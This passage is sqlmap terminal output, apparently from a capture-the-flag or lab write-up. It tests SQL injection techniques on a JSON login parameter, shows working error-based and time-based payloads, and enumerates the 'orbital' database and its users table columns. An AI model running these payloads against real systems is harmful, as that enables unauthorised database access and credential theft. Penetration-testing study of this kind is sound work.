</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (MAKE_SET)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (ELT)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (ELT - original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (bool*int)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">03</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL boolean-based blind - Parameter replace (bool*int - original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">05</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0 boolean-based blind - Stacked queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &lt; 5.0 boolean-based blind - Stacked queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">35</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">43</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">potential</span> <span class="n">permission</span> <span class="n">problems</span> <span class="n">detected</span> <span class="p">(</span><span class="s1">&#39;command denied&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">25</span><span class="p">:</span><span class="mi">59</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="p">(</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span> <span class="n">parameter</span> <span class="s1">&#39;JSON username&#39;</span> <span class="n">is</span> <span class="s1">&#39;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&#39;</span> <span class="n">injectable</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL inline queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="p">(</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span> <span class="n">parameter</span> <span class="s1">&#39;JSON username&#39;</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span> <span class="n">injectable</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">automatically</span> <span class="n">extending</span> <span class="n">ranges</span> <span class="k">for</span> <span class="n">UNION</span> <span class="n">query</span> <span class="n">injection</span> <span class="n">technique</span> <span class="n">tests</span> <span class="n">as</span> <span class="n">there</span> <span class="n">is</span> <span class="n">at</span> <span class="n">least</span> <span class="n">one</span> <span class="n">other</span> <span class="p">(</span><span class="n">potential</span><span class="p">)</span> <span class="n">technique</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="s1">&#39;ORDER BY&#39;</span> <span class="n">technique</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">usable</span><span class="o">.</span> <span class="n">This</span> <span class="n">should</span> <span class="n">reduce</span> <span class="n">the</span> <span class="n">time</span> <span class="n">needed</span> <span class="n">to</span> <span class="n">find</span> <span class="n">the</span> <span class="n">right</span> <span class="n">number</span> <span class="n">of</span> <span class="n">query</span> <span class="n">columns</span><span class="o">.</span> <span class="n">Automatically</span> <span class="n">extending</span> <span class="n">the</span> <span class="nb">range</span> <span class="k">for</span> <span class="n">current</span> <span class="n">UNION</span> <span class="n">query</span> <span class="n">injection</span> <span class="n">technique</span> <span class="n">test</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">have</span> <span class="mi">2</span> <span class="n">columns</span> <span class="ow">in</span> <span class="n">query</span>
</span></span><span class="line"><span class="cl"><span class="k">do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="p">(</span><span class="n">re</span><span class="p">)</span><span class="n">try</span> <span class="n">to</span> <span class="n">find</span> <span class="n">proper</span> <span class="n">UNION</span> <span class="n">column</span> <span class="n">types</span> <span class="n">with</span> <span class="n">fuzzy</span> <span class="n">test</span><span class="err">?</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">51</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="k">if</span> <span class="n">UNION</span> <span class="n">based</span> <span class="n">SQL</span> <span class="n">injection</span> <span class="n">is</span> <span class="ow">not</span> <span class="n">detected</span><span class="p">,</span> <span class="n">please</span> <span class="n">consider</span> <span class="n">usage</span> <span class="n">of</span> <span class="n">option</span> <span class="s1">&#39;--union-char&#39;</span> <span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span> <span class="s1">&#39;--union-char=1&#39;</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">54</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">target</span> <span class="n">URL</span> <span class="n">appears</span> <span class="n">to</span> <span class="n">be</span> <span class="n">UNION</span> <span class="n">injectable</span> <span class="n">with</span> <span class="mi">2</span> <span class="n">columns</span>
</span></span><span class="line"><span class="cl"><span class="n">injection</span> <span class="ow">not</span> <span class="n">exploitable</span> <span class="n">with</span> <span class="n">NULL</span> <span class="n">values</span><span class="o">.</span> <span class="n">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">try</span> <span class="n">with</span> <span class="n">a</span> <span class="n">random</span> <span class="n">integer</span> <span class="n">value</span> <span class="k">for</span> <span class="n">option</span> <span class="s1">&#39;--union-char&#39;</span><span class="err">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="p">]</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">02</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (random number) - 1 to 20 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">06</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (NULL) - 21 to 40 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">09</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (random number) - 21 to 40 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">12</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (NULL) - 41 to 60 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (random number) - 41 to 60 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">18</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (NULL) - 61 to 80 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (random number) - 61 to 80 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">24</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (NULL) - 81 to 100 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">27</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="s1">&#39;MySQL UNION query (random number) - 81 to 100 columns&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span> <span class="n">parameter</span> <span class="s1">&#39;JSON username&#39;</span> <span class="n">is</span> <span class="n">vulnerable</span><span class="o">.</span> <span class="n">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="n">to</span> <span class="n">keep</span> <span class="n">testing</span> <span class="n">the</span> <span class="n">others</span> <span class="p">(</span><span class="k">if</span> <span class="n">any</span><span class="p">)</span><span class="err">?</span> <span class="p">[</span><span class="n">y</span><span class="o">/</span><span class="n">N</span><span class="p">]</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl"><span class="n">sqlmap</span> <span class="n">identified</span> <span class="n">the</span> <span class="n">following</span> <span class="n">injection</span> <span class="n">point</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">with</span> <span class="n">a</span> <span class="n">total</span> <span class="n">of</span> <span class="mi">1397</span> <span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">requests</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span>
</span></span><span class="line"><span class="cl"><span class="n">Parameter</span><span class="p">:</span> <span class="n">JSON</span> <span class="n">username</span> <span class="p">((</span><span class="n">custom</span><span class="p">)</span> <span class="n">POST</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Type</span><span class="p">:</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span>
</span></span><span class="line"><span class="cl">    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span> <span class="n">AND</span> <span class="n">error</span><span class="o">-</span><span class="n">based</span> <span class="o">-</span> <span class="n">WHERE</span><span class="p">,</span> <span class="n">HAVING</span><span class="p">,</span> <span class="n">ORDER</span> <span class="n">BY</span> <span class="ow">or</span> <span class="n">GROUP</span> <span class="n">BY</span> <span class="n">clause</span> <span class="p">(</span><span class="n">FLOOR</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Payload</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span> <span class="n">AND</span> <span class="p">(</span><span class="n">SELECT</span> <span class="mi">2242</span> <span class="n">FROM</span><span class="p">(</span><span class="n">SELECT</span> <span class="n">COUNT</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">CONCAT</span><span class="p">(</span><span class="mh">0x71716a6a71</span><span class="p">,(</span><span class="n">SELECT</span> <span class="p">(</span><span class="n">ELT</span><span class="p">(</span><span class="mi">2242</span><span class="o">=</span><span class="mi">2242</span><span class="p">,</span><span class="mi">1</span><span class="p">))),</span><span class="mh">0x71626b7871</span><span class="p">,</span><span class="n">FLOOR</span><span class="p">(</span><span class="n">RAND</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="n">FROM</span> <span class="n">INFORMATION_SCHEMA</span><span class="o">.</span><span class="n">PLUGINS</span> <span class="n">GROUP</span> <span class="n">BY</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="o">--</span> <span class="n">IPSK</span><span class="s2">&#34;,&#34;</span><span class="n">password</span><span class="s2">&#34;:&#34;</span><span class="n">password</span><span class="s2">&#34;}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Type</span><span class="p">:</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
</span></span><span class="line"><span class="cl">    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span><span class="o">.</span><span class="mi">12</span> <span class="n">AND</span> <span class="n">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span> <span class="p">(</span><span class="n">query</span> <span class="n">SLEEP</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">Payload</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;admin&#34;</span> <span class="n">AND</span> <span class="p">(</span><span class="n">SELECT</span> <span class="mi">4429</span> <span class="n">FROM</span> <span class="p">(</span><span class="n">SELECT</span><span class="p">(</span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">Llei</span><span class="p">)</span><span class="o">--</span> <span class="n">Mhzj</span><span class="s2">&#34;,&#34;</span><span class="n">password</span><span class="s2">&#34;:&#34;</span><span class="n">password</span><span class="s2">&#34;}</span>
</span></span><span class="line"><span class="cl"><span class="o">---</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">the</span> <span class="n">back</span><span class="o">-</span><span class="n">end</span> <span class="n">DBMS</span> <span class="n">is</span> <span class="n">MySQL</span>
</span></span><span class="line"><span class="cl"><span class="n">back</span><span class="o">-</span><span class="n">end</span> <span class="n">DBMS</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mf">5.0</span> <span class="p">(</span><span class="n">MariaDB</span> <span class="n">fork</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="n">missing</span> <span class="n">database</span> <span class="n">parameter</span><span class="o">.</span> <span class="n">sqlmap</span> <span class="n">is</span> <span class="n">going</span> <span class="n">to</span> <span class="n">use</span> <span class="n">the</span> <span class="n">current</span> <span class="n">database</span> <span class="n">to</span> <span class="n">enumerate</span> <span class="n">table</span><span class="p">(</span><span class="n">s</span><span class="p">)</span> <span class="n">entries</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">44</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">current</span> <span class="n">database</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">tables</span> <span class="k">for</span> <span class="n">database</span><span class="p">:</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;communication&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;users&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">columns</span> <span class="k">for</span> <span class="n">table</span> <span class="s1">&#39;users&#39;</span> <span class="ow">in</span> <span class="n">database</span> <span class="s1">&#39;orbital&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">45</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;id&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;int(11)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;username&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;password&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">46</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">retrieved</span><span class="p">:</span> <span class="s1">&#39;varchar(255)&#39;</span>
